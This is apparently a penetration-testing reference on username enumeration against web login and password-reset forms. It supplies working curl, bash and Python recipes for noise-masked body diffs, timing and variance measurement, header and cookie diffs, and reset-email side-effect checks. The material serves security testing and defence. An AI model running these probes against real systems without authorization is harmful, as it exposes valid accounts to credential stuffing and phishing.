# Differentials (deep) — the oracle channels, fully worked

## The noise-baseline first — always

Before any diff, find what varies per-request:

```bash
curl -s -X POST -d 'user=zzz-NOSUCH&pass=x' "$BASE/<form>" -o b1
curl -s -X POST -d 'user=zzz-NOSUCH&pass=x' "$BASE/<form>" -o b2
diff b1 b2     # these lines vary per-request -> the noise to mask
```

Common noise: CSRF hidden inputs, `nonce`, `request_id`, `timestamp`,
rotating CSRF cookies, ad/banner content, a `data-csrf` attribute,
per-request `X-Request-Id` headers. Mask with `sed` before the real diff.

## The masked body diff — the full protocol

```bash
mask() { sed -E 's/(csrf|nonce|token|request_id|_ts|timestamp)[^<"& ]*//g; s/value="[^"]*"/value=""/g'; }
diff <(mask < good) <(mask < b1)
```

What survives the mask is the differential. Classify the survivor:

- an error-message word → text oracle
- a CSS class / `data-` / hidden input → code oracle
- a JSON field/value → JSON oracle
- a comment → comment oracle
- nothing survives → body channel uniform

## The timing deep-protocol

```bash
# N=12, interleaved, same-connection where possible
> t; for i in $(seq 12); do
  curl -s -o /dev/null -w "g %{time_total}\n" -X POST -d 'user=KNOWN&pass=x' "$BASE/<f>" >> t
  curl -s -o /dev/null -w "b %{time_total}\n" -X POST -d 'user=zzz-NOSUCH&pass=x' "$BASE/<f>" >> t
done
python3 -c "
import statistics as s
g=[float(l.split()[1]) for l in open('t') if l.startswith('g')]
b=[float(l.split()[1]) for l in open('t') if l.startswith('b')]
print('good_med',round(s.median(g),3),'bad_med',round(s.median(b),3),
      'delta',round(s.median(g)-s.median(b),3),'jitter',round(s.stdev(g+b),3))
"
```

`delta > ~3*jitter` and repeats on a second bad name = the oracle.

## The variance oracle — when the median is equal

A time-equalized app (a dummy hash on the miss) has LOWER variance on
the bad arm — one fixed hash vs a per-user variable-cost hash. Measure
`stdev(good)` vs `stdev(bad)`: a consistent variance gap is itself the
oracle.

## The envelope diff — every header and cookie

```bash
envdiff() { diff <(curl -sD - -o/dev/null -X POST -d "user=$1&pass=x" "$BASE/<f>" | grep -iE 'http/|set-cookie|x-|retry|ratelimit') <(curl -sD - -o/dev/null -X POST -d "user=$2&pass=x" "$BASE/<f>" | grep -iE 'http/|set-cookie|x-|retry|ratelimit'); }
envdiff KNOWN zzz-NOSUCH
```

A `Set-Cookie`, an `X-RateLimit-Remaining` decrement, a `Retry-After`,
an `X-Auth-Reason`, a `Location` — the envelope carries the channel the
body does not.

## The send-side-effect verify

A uniform response that still sends the email only for a real row:

```bash
# submit YOUR email + a random one; the difference is the queued send
curl -s -X POST -d 'email=YOU@x.c' "$BASE/reset" | grep -oE '(sent|queued|to|emails)[^,}]*'
curl -s -X POST -d 'email=zzz@x.c' "$BASE/reset" | grep -oE '(sent|queued|to|emails)[^,}]*'
```
